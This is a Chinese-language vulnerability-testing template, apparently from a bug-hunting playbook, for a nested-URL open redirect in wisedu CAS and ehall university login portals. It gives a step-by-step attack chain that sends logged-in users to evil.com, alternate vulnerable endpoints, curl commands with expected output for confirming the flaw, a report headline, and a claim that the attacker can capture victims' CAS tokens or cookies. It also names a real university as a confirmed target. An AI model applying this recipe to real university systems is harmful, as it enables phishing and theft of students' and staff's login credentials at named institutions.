# wisedu CAS嵌套URL Open Redirect 测试模式

## 触发条件
- wisedu CAS: `uia.*.edu.cn/authserver/login`
- ehall金智教育: `ehall.*.edu.cn`

## 攻击原理
CAS验证service参数时只检查域名是否在白名单内，但接受嵌套URL。ehall login页面将service参数直接传递给CAS，不做验证。

## 攻击链
1. 攻击者构造: `https://ehall.XXX.edu.cn/login?service=https://evil.com`
2. ehall重定向到CAS: `https://uia.XXX.edu.cn/authserver/login?service=http://ehall.XXX.edu.cn/login?service=https://evil.com`
3. CAS验证域名(ehall.XXX.edu.cn在白名单) → 接受
4. 用户在CAS登录 → CAS重定向到 `ehall.XXX.edu.cn/login?service=https://evil.com`
5. ehall处理service参数 → 重定向到 `https://evil.com`

## 替代路径
- ehall `/redirect?url=` 端点同样存在此问题
- ehall `/callback?next=` 端点同样存在此问题

## 验证命令
```bash
# 验证CAS接受嵌套URL
curl -sk "https://uia.XXX.edu.cn/authserver/login?service=https://ehall.XXX.edu.cn/login?service=https://evil.com" | grep -oP 'action="[^"]*"'
# 应返回: action="/authserver/login?service=https://ehall.XXX.edu.cn/login?service=https://evil.com"

# 验证ehall接受任意service参数
curl -sk -D- "https://ehall.XXX.edu.cn/login?service=https://evil.com" | grep -i location
# 应返回: Location: https://uia.XXX.edu.cn:443/authserver/login?service=http%3A%2F%2Fehall.XXX.edu.cn%2Flogin%3Fservice%3Dhttps%3A%2F%2Fevil.com

# 验证ehall /redirect端点
curl -sk -D- "https://ehall.XXX.edu.cn/redirect?url=https://evil.com" | grep -i location
```

## 报告角度
"XXX大学统一认证系统存在URL重定向漏洞可窃取用户凭证" [中危]

## 注意事项
- 直接 `service=https://evil.com` 会被CAS拒绝(域名不在白名单)
- 必须通过ehall中转(ehall在CAS白名单内)
- 需要用户点击恶意链接并完成CAS登录才能触发
- 攻击者可在evil.com记录受害者的CAS凭证(token/cookie)

## 实战案例
- 南京林业大学 (njfu.edu.cn) - 2026-06-01
